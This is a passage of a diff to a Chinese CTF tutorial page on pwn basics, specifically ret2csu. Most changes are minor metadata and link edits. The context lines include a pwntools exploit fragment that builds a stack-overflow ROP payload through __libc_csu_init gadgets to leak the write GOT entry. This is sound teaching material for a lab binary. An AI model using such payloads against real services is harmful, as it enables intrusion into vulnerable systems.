@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://i.postimg.cc/rmgDFVZn/2024-12-22-154842.png">
 <meta property="og:image" content="https://i.postimg.cc/mrpr0XPJ/2024-12-22-160513.png">
 <meta property="article:published_time" content="2024-12-21T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-12-22T08:15:12.555Z">
+<meta property="article:modified_time" content="2024-12-22T08:19:13.659Z">
 <meta property="article:author" content="AlexD">
 <meta property="article:tag" content="pwn基础">
 <meta name="twitter:card" content="summary">
@@ -234,7 +234,7 @@
 <p>当然，你应该也发现了我的示例里有两个脚本，exp1没有使用csu，<br />
 而是直接控制了寄存器，这是因为在这个示例里rdx的值足够大（大于8），也就足够输出我们需要的got表值了。如果在其他情况下，那exp1则是无效的。</p>
 </blockquote>
-<p>还有一点就是，我的示例里用的是我本地的libc，<a target="_blank" rel="noopener" href="http://xn--libc-fb5f91c853gyk1al6rns4brjkeid.so">而不是附件里面的libc.so</a>，如果你无法打通，请参考ret2libc相关知识，将脚本适当调整（在[[栈上fmt学习]]也用到了）</p>
+<p>还有一点就是，我的示例里用的是我本地的libc，<a target="_blank" rel="noopener" href="http://xn--libc-fb5f91c853gyk1al6rns4brjkeid.so">而不是附件里面的libc.so</a>，如果你无法打通，请参考ret2libc相关知识，将脚本适当调整（在栈上fmt学习也用到了）</p>
 <h2 id="控制csu泄露got表"><a class="markdownIt-Anchor" href="#控制csu泄露got表"></a> 控制csu泄露got表</h2>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">csu1 = <span class="number">0x40061A</span></span><br><span class="line">csu2 = <span class="number">0x400600</span></span><br><span class="line">write_addr = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x88</span></span><br><span class="line">    payload += p64(csu1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu2)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_addr, <span class="number">8</span>, write_addr, <span class="number">1</span>, main_addr)</span><br></pre></td></tr></table></figure>
 <p>r13、r14、r15根据这一部分的csu<br />
